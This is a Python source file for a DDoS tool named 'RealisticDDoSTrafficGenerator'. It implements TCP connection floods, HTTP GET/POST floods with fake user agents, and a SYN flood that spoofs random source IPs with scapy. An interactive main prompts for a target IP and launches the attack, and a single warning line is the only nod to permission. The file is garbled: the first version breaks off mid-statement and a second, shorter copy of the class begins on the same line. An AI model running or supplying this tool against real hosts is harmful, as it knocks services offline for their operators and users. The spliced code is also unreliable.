import os
import sys
import socket
import random
import time
import threading
import numpy as np
from scapy.all import *
from faker import Faker

# Fix for PowerShell
if sys.platform == 'win32':
    os.system("")
    sys.stdout.reconfigure(line_buffering=True)

fake = Faker()

class RealisticDDoSTrafficGenerator:
    def __init__(self, target_ip, target_port=80, duration=300, intensity=5):
        """
        :param target_ip: Target server IP
        :param target_port: Target port (80 for HTTP)
        :param duration: Attack duration in seconds
        :param intensity: Attack strength (1-10 scale)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.intensity = max(1, min(10, intensity))
        self.stop_flag = False
        self.packet_count = 0
        
        # Intensity scaling factors
        self.thread_count = int(10 * (intensity ** 1.5))  # Exponential scaling
        self.packet_delay = 0.1 / (intensity ** 0.7)      # Inverse scaling
        
    def _log_attack(self, attack_type):
        self.packet_count += 1
        if self.packet_count % 100 == 0:
            print(f"\r{attack_type}: {self.packet_count} packets sent", end="")

    def tcp_flood(self):
        """Enhanced TCP flood with realistic patterns"""
        print(f"\nStarting TCP flood ({self.thread_count} threads)")
        
        def worker():
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target_ip, self.target_port))
                    
                    # Vary packet sizes and patterns
                    if random.random() > 0.7:  # 30% chance for larger packets
                        payload = ("GET /?" + fake.uri_path() + " HTTP/1.1\r\n"
                                 f"Host: {self.target_ip}\r\n"
                                 f"User-Agent: {fake.user_agent()}\r\n"
                                 "Accept: */*\r\n\r\n").encode()
                    else:
                        payload = random._urandom(random.randint(64, 2048))
                    
                    s.send(payload)
                    self._log_attack("TCP Flood")
                    time.sleep(self.packet_delay * random.uniform(0.5, 1.5))
                    s.close()
                except:
                    pass

        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01)  # Stagger thread starts
            
        for t in threads:
            t.join()

    def syn_flood(self):
        """Advanced SYN flood with IP spoofing"""
        print(f"\nStarting SYN flood ({self.thread_count} threads)")
        
        def worker():
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_flag:
                # Spoof source IPs from random subnets
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}." \
                         f"{random.randint(1,255)}.{random.randint(1,255)}"
                
                ip = IP(src=src_ip, dst=self.target_ip)
                tcp = TCP(sport=random.randint(1024, 65535), 
                         dport=self.target_port, 
                         flags="S", 
                         seq=random.randint(0, 2**32-1),
                         window=random.randint(1024, 65535))
                
                # Randomize packet sizes
                send(ip/tcp/Raw(RandString(size=random.randint(0, 512))), verbose=0)
                self._log_attack("SYN Flood")
                time.sleep(self.packet_delay * random.uniform(0.1, 0.5))

        self._start_threaded_attack(worker)

    def http_flood(self):
        """Realistic HTTP flood with varied requests"""
        print(f"\nStarting HTTP flood ({self.thread_count} threads)")
        
        user_agents = [fake.user_agent() for _ in range(100)]
        urls = ["/", "/index.html", "/api/v1/data", "/wp-admin", "/images/logo.png",
                "/search?q=" + fake.word(), "/product/" + fake.uuid4()]
        
        def worker():
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_ip, self.target_port))
                    
                    # Vary request types
                    if random.random() > 0.5:
                        request = (f"GET {random.choice(urls)} HTTP/1.1\r\n"
                                  f"Host: {self.target_ip}\r\n"
                                  f"User-Agent: {random.choice(user_agents)}\r\n"
                                  "Accept: text/html,application/xhtml+xml\r\n"
                                  "Connection: keep-alive\r\n\r\n")
                    else:
                        request = (f"POST {random.choice(urls)} HTTP/1.1\r\n"
                                  f"Host: {self.target_ip}\r\n"
                                  f"User-Agent: {random.choice(user_agents)}\r\n"
                                  "Content-Type: application/x-www-form-urlencoded\r\n"
                                  f"Content-Length: {random.randint(10, 2000)}\r\n\r\n"
                                  f"data={fake.text(max_nb_chars=random.randint(10, 2000))}")
                    
                    s.send(request.encode())
                    self._log_attack("HTTP Flood")
                    time.sleep(self.packet_delay * random.uniform(0.2, 1.0))
                    s.close()
                except:import socket
import random
import time
import threading
from faker import Faker

fake = Faker()

class RealisticDDoSTrafficGenerator:
    def __init__(self, target_ip, target_port=80, duration=30, intensity=5):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.intensity = max(1, min(10, intensity))
        self.stop_flag = False
        self.packet_count = 0
        self.thread_count = 10 + (intensity * 5)  # Scale threads with intensity
        self.packet_delay = 0.1 / (intensity ** 0.7)

    def _log_attack(self, attack_type):
        self.packet_count += 1
        if self.packet_count % 100 == 0:
            print(f"\r{attack_type}: {self.packet_count} packets", end="", flush=True)

    def tcp_flood(self):
        """High-volume TCP connection flood"""
        def worker():
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target_ip, self.target_port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                    self._log_attack("TCP Flood")
                    time.sleep(self.packet_delay)
                    s.close()
                except:
                    pass

        self._start_threaded_attack(worker)

    def http_flood(self):
        """Realistic HTTP request flood"""
        user_agents = [fake.user_agent() for _ in range(50)]
        urls = ["/", "/index.html", "/api/data", "/wp-admin"]

        def worker():
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target_ip, self.target_port))
                    
                    request = (f"GET {random.choice(urls)} HTTP/1.1\r\n"
                             f"Host: {self.target_ip}\r\n"
                             f"User-Agent: {random.choice(user_agents)}\r\n\r\n")
                    
                    s.send(request.encode())
                    self._log_attack("HTTP Flood")
                    time.sleep(self.packet_delay * random.uniform(0.5, 1.5))
                    s.close()
                except:
                    pass

        self._start_threaded_attack(worker)

    def _start_threaded_attack(self, worker_func):
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=worker_func)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Wait for duration or until stopped
        start_time = time.time()
        while time.time() - start_time < self.duration and not self.stop_flag:
            time.sleep(0.1)
        
        self.stop_flag = True
        for t in threads:
            t.join()

    def run_test(self):
        """Run a test with visual feedback"""
        print(f"\n🚀 Starting attack (Intensity: {self.intensity}, Duration: {self.duration}s)")
        print(f"🔗 Target: {self.target_ip}:{self.target_port}")
        print(f"🧵 Threads: {self.thread_count}")
        
        start_time = time.time()
        self.http_flood()  # Start with HTTP flood (most reliable)
        
        # Live progress display
        while time.time() - start_time < self.duration and not self.stop_flag:
            elapsed = int(time.time() - start_time)
            remaining = max(0, self.duration - elapsed)
            print(f"\r⏱️ Elapsed: {elapsed}s | Remaining: {remaining}s | Packets: {self.packet_count}", end="", flush=True)
            time.sleep(0.5)
        
        print(f"\n✅ Test completed. Total packets sent: {self.packet_count}")

if __name__ == "__main__":
    print("=== DDoS Test Generator ===")
    print("WARNING: Only use on systems you own or have permission to test!")
    
    TARGET_IP = input("Enter target IP (e.g., 192.168.1.100): ").strip()
    INTENSITY = int(input("Attack intensity (1-10): "))
    DURATION = int(input("Duration (seconds): "))
    
    # Verify target is reachable
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.settimeout(3)
        test_socket.connect((TARGET_IP, 80))
        test_socket.close()
    except:
        print(f"❌ Error: Cannot connect to {TARGET_IP}:80")
        print("Check: 1) Target is online 2) Firewall allows port 80 3) Correct IP")
        exit(1)
    
    generator = RealisticDDoSTrafficGenerator(
        target_ip=TARGET_IP,
        intensity=INTENSITY,
        duration=DURATION
    )
    
    try:
        generator.run_test()
    except KeyboardInterrupt:
        generator.stop_flag = True
        print("\n🛑 Attack stopped by user")